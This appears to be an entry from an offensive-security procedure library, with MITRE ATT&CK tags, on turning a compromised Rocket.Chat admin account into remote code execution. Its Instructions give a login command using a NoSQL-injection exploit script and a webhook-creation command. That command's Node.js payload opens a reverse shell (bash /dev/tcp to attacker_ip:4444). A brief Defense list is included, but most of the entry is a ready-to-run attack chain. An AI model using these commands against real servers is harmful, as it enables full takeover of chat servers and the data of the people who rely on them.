---
tags:
  - privilege-escalation
  - rce
  - webhook-abuse
type: procedure
tools:
  - '[[tools/pre_auth_nosqli.py]]'
tactics:
  - '[[Privilege Escalation]]'
  - '[[Execution]]'
commands: []
verified: false
platforms:
  - Web
  - Linux
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Valid Accounts]]'
  - '[[Command-Line Interface]]'
updated_at: '2025-12-14T17:31:30.563Z'
skill_level: advanced
impact_level: critical
detection_risk: high
sub_techniques: []
id: 15c3a8ce-c97c-490e-9f7a-520948225726
validated: true
mitre_tactics:
  - '[[Privilege Escalation]]'
  - '[[Execution]]'
mitre_techniques:
  - '[[Valid Accounts]]'
  - '[[Command-Line Interface]]'
---
# Take-Over-Admin-Account-and-Create-Webhook-for-RCE

## Summary

This procedure logs in as the compromised admin and creates an incoming webhook with a script payload to execute arbitrary commands server-side, achieving RCE.

## Description

With admin access, create an Incoming Integration webhook configured to run scripts on incoming messages. Payloads execute without isolation as the rocketchat user, allowing shell commands. Targets versions without webhook sandboxing.

## Requirements

1. Valid admin session
2. Admin privileges
3. Attacker listener for reverse shell

## Defense

Defensive measures and detection strategies:

- Disable or sandbox webhook script execution
- Require approval for new integrations
- Monitor for new webhooks and script runs in logs

## Objectives

1. Escalate to server execution
2. Gain shell as rocketchat
3. Compromise full environment

## Instructions

### Step 1: Login as Admin

**Context**: Use new credentials to authenticate.

**Command** ([[commands/run-exploit-script]]):
```bash
python3 pre_auth_nosqli.py 'http://localhost:3000' 'admin@rocketchat.local' --login --password 'newpass123'
```

> Obtains auth token. Expected: Session established.

### Step 2: Create Malicious Webhook

**Context**: POST to integrations.create with script payload.

**Command** ([[commands/run-exploit-script]]):
```bash
python3 pre_auth_nosqli.py 'http://localhost:3000' 'admin@rocketchat.local' --create-webhook --script 'require("child_process").exec("bash -i >& /dev/tcp/attacker_ip/4444 0>&1")'
```

> Webhook triggers on message, executes Node.js script for RCE. Expected: Webhook ID returned, shell connects.

## MITRE ATT&CK Mapping

### Tactics

- [[Privilege Escalation]]
- [[Execution]]

### Techniques

- [[Valid Accounts]]
- [[Command-Line Interface]]

### Sub-Techniques


## Commands Used


## Tools Used

- [[tools/pre_auth_nosqli.py]]

## Tags

- privilege-escalation
- rce
- webhook-abuse
